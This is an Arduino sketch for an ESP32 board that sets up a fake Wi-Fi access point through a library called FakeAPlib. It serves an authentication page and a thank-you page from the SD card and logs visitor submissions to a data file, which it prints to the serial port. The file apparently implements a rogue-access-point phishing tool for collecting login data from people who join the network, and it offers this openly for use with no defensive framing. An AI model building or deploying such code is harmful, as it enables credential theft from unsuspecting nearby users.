/**
 * @file fake_access_point.ino
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief The pins and functions for reading and writting to a SD are already defined in the SDFiles src files.
 * Note that this is only meant to be used for a ESP32 board which has an integrated SD reader.
 * The dependencies of this library are:
 * - FS.h
 * - SD_MMC.h
 *
 * @version 0.1
 * @date 2024-12-29
 *
 * @copyright Copyright (c) 2024
 *
 */

#include <FakeAPlib.h>

const char *authPage  = "/folder/index.htm";
const char *thksPage  = "/folder/page.htm";
const char *dataFile  = "/folder/data.txt";
const char *ssid	  	= "AP_SSID";
const char *psw 	  	= "AP_PASS";	// optional
const char *WIFI_SSID = "STA_SSID"; // optional
const char *WIFI_PSW  = "STA_PASS";	// optional

IPAddress apip(192, 168, 1, 1);
IPAddress serverip(10, 10, 1, 1);

FakeAP* accessPoint = new FakeAP(80);

void setup()
{
	Serial.begin(115200);
	delay(2000);

	Serial.println("Loading....");
	accessPoint->setPath(authPage, INDEXPAGE);
	accessPoint->setPath(thksPage, EXITPAGE);
	accessPoint->setPath(dataFile, DATAFILE);

	WiFi.mode(WIFI_AP_STA);
	WiFi.softAPConfig(apip, apip, IPAddress(255, 255, 255, 0));
	WiFi.hostname("ESP_Server");

	if (!accessPoint->initialize(ssid, psw))
		Serial.println("Error en la configuración del punto de acceso");

	if (!accessPoint->setWifiStation(WIFI_SSID, WIFI_PSW))
    	Serial.println("Conexión a la wifi fallada.");
	
	Serial.println("Config done!");
}

void loop()
{
	accessPoint->process();
	Serial.println("Acces point on. Listenning....");
	accessPoint->printFilesContent();
}